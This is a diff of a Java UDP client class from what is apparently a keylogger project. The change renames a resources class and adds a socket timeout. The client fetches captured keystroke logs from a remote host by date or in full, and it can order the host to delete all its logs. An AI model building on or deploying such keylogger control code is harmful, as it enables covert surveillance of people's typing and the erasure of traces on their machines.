@@ -5,17 +5,15 @@ import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.net.SocketException;
+import java.net.SocketTimeoutException;
 import java.net.UnknownHostException;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.StringTokenizer;
-
-import javax.swing.text.SimpleAttributeSet;
 
 import com.hao.keylogger.models.Log;
-import com.hao.keylogger.models.Resource;
+import com.hao.keylogger.models.Resources;
 
 public class UDPClientHelper {
 	public enum ReceiveMode {
@@ -33,7 +31,7 @@ public class UDPClientHelper {
 	
 	ReceiveMode receiveMode;
 
-	byte[] buffer = new byte[Resource.CLIENT_BUFFER_SIZE];
+	byte[] buffer = new byte[Resources.CLIENT_BUFFER_SIZE];
 
 	/**
 	 * Create new socket
@@ -46,6 +44,7 @@ public class UDPClientHelper {
 	public UDPClientHelper(ClientLogController controller, InetAddress inetAddress, int port)
 			throws SocketException, UnknownHostException {
 		socket = new DatagramSocket();
+		socket.setSoTimeout(Resources.TIME_OUT);
 		address = inetAddress;
 		this.port = port;
 		this.controller = controller;
@@ -103,7 +102,7 @@ public class UDPClientHelper {
 		receiveMode = ReceiveMode.GET_LOG;
 		String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);
 
-		String msg = Resource.FETCH_LOG_REQUEST + "?" + dateStr;
+		String msg = Resources.FETCH_LOG_REQUEST + "?" + dateStr;
 
 		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
 		try {
@@ -124,7 +123,7 @@ public class UDPClientHelper {
 	 */
 	public void fetchAllLogs() {
 		receiveMode = ReceiveMode.GET_LOG;
-		String msg = Resource.FETCH_ALL_LOG_REQUEST + "?";
+		String msg = Resources.FETCH_ALL_LOG_REQUEST + "?";
 		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
 		try {
 			socket.send(outPacket);
@@ -195,16 +194,18 @@ public class UDPClientHelper {
 			try {
 				socket.receive(inPacket);
 				receiveMsg = new String(inPacket.getData(), 0, inPacket.getLength());
+			} catch (SocketTimeoutException e) {
+				controller.receiveMessageFromServer(e.getMessage());
 			} catch (IOException ex) {
 				ex.printStackTrace();
-			}
+			} 
 			return receiveMsg;
 		}
 	}
 
 	public void deleteAllHostLogs() {
 		receiveMode = ReceiveMode.GET_MSG;
-		String msg = Resource.DELETE_ALL_HOST_LOGS + "?";
+		String msg = Resources.DELETE_ALL_HOST_LOGS + "?";
 		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
 		try {
 			socket.send(outPacket);
